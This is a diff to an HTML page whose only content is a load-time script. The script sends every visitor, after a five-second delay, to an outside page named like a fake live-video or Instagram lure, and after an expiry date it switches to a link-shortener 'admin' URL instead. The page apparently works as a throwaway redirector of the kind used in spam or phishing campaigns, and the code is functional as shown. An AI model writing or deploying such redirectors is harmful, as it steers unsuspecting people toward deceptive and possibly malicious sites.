@@ -93,22 +93,30 @@
 </head>
 
 <body>
-    <script>
-        function checkExpiration() {
-            const expirationDate = "2026-02-27";
-            const today = new Date().toISOString().split("T")[0];
-            const adminurl = "https://alink.pp.ua/duckist";
+<script>
+    function checkExpiration() {
+        const expirationDate = "2026-02-27";
+        const today = new Date().toISOString().split("T")[0];
+        const adminurl = "https://alink.pp.ua/duckist";
+        const redirectUrl = "https://videotop24.com/livevideos.live/insta1.html";
 
-            if (today > expirationDate) {
-                window.location.href = adminurl;
-            } else {
-                const redirectUrl = "https://videotop24.com/livevideos.live/insta1.html";
-                window.location.href = redirectUrl;
-            }
+        let targetUrl;
+
+        if (today > expirationDate) {
+            targetUrl = adminurl;
+        } else {
+            targetUrl = redirectUrl;
         }
 
-        window.onload = checkExpiration;
-    </script>
+        // 5 second delay (5000 ms)
+        setTimeout(function () {
+            window.location.href = targetUrl;
+        }, 5000);
+    }
+
+    window.onload = checkExpiration;
+</script>
+
 </body>
 
 </html>
